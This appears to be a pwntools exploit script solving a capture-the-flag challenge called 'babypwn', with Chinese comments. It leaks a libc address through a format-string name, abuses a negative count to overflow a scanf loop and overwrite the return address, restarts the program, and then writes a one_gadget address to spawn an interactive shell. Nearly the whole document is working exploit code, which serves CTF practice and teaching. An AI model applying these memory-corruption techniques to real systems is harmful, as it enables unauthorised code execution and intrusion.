# -*- coding: UTF-8 -*-

from pwn import *
# context.log_level = "debug"
pipe = process("./babypwn", env = {'LD_PRELOAD':'./libc'})
libc = ELF("./libc")


def gameStart(name, coin):
    print(pipe.recvline("Create a tressure box?"))
    pipe.sendline('y')
    print(pipe.recvuntil("name: "))
    pipe.sendline(name)
    print(pipe.recvline())
    pipe.sendline(str(coin))

gameStart(".%8$s.", -1)

# 进入 scanf 环节，每次写入 4bytes 因为 scanf 用的 %d，每个地址占8字节，高位用0填充
# putGOT = 0x00600fb0 = 6295472     mallocGOT = 0x00600fe0 = 6295520
pipe.sendline('6295472')
pipe.sendline('0')


pipe.sendline('6295520')
pipe.sendline('0')

# scanf 写回的地址起始为 rbp-60h，因此 rbp-68h 是返回地址，前面填充两个地址，68h - 10h = 58h 58h/4 = 22 单位的4字节
for i in range(22): 
    pipe.sendline('+')  # 使用加号不会修改内容

# _start = 0x00400710 = 4196112, 覆盖返回地址为 _start 回到程序最开始位置，restart game
pipe.sendline('4196112')
pipe.sendline('0')

# 填充剩余的 scanf 内容，因为输入 -1 = ff， ffh * 4 - 70h = 908、4 = 227 
for i in range(227):    
    pipe.sendline('+')

leakInfo = pipe.recvline()
# pipe.recvline()
value = leakInfo.split(".")[1]
putGOT = u64(value + "\x00"*(8-len(value)))
print("puts function GOT: 0x%x" % putGOT)

libcBase = putGOT - libc.symbols['puts']
print("libc Base address: 0x%x" % libcBase)
one_gadGet = libcBase + 0xf1147
print("One_gadget address: 0x%x" % one_gadGet)

# 第一次 game 通过控制 -1 传入，使得可以覆盖返回地址，为了维持工作，设置返回地址为程序的初始位置 `_start`，开始新一轮的game，这次覆盖成 one_gadget
gameStart("57005", -1)

for i in range(26):
    pipe.sendline("+")

pipe.sendline(str((one_gadGet & 0xffffffff)))
pipe.sendline(str(one_gadGet >> 32))

for i in range(227):
    pipe.sendline("+")

pipe.interactive()